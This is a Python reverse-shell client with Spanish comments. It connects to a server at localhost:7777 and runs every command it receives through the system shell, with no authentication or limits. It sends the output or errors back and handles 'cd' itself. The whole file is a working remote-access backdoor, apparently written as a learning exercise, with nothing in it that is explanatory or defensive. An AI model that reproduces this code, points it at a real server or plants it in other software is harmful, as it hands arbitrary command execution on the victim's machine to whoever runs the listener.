import socket
import subprocess
import os

def main():
    cliente = socket.socket()

    try:
        cliente.connect(('localhost', 7777))  # Conectar al servidor

        # Primero enviar el mensaje de conexión "1"
        sending_object = bytes("1", encoding='utf-8')
        cliente.send(sending_object)  # Envía el mensaje inicial

        # Luego enviar el directorio actual
        current_directory = os.getcwd()  # Obtén el directorio inicial
        print(f"Directorio inicial (cliente): {current_directory}")

        while True:
            c = cliente.recv(1024)
            comando = c.decode().strip()
            print(f"Comando recibido: {comando}")

            if comando.startswith('cd'):
                try:
                    # Cambia el directorio manualmente
                    path = comando.split(' ', 1)[1].strip()
                    os.chdir(path)
                    current_directory = os.getcwd()
                    print(f"Directorio cambiado a: {current_directory}")
                    cliente.send(bytes(f"Directorio cambiado a: {current_directory}\n", encoding='utf-8'))
                except Exception as e:
                    error_message = f"Error al cambiar de directorio: {str(e)}"
                    print(error_message)
                    cliente.send(bytes(error_message, encoding='utf-8'))
            else:
                # Ejecutar otros comandos
                comando_proceso = subprocess.Popen(
                    comando,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                stdout_data, stderr_data = comando_proceso.communicate()

                if stderr_data:
                    # Envía errores si los hay
                    print(f"Error: {stderr_data.decode()}")
                    cliente.send(stderr_data)
                else:
                    # Envía la salida del comando
                    print(f"Resultado: {stdout_data.decode()}")
                    cliente.send(stdout_data)

    except Exception as e:
        print(f"Se arrojó una excepción: {e}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
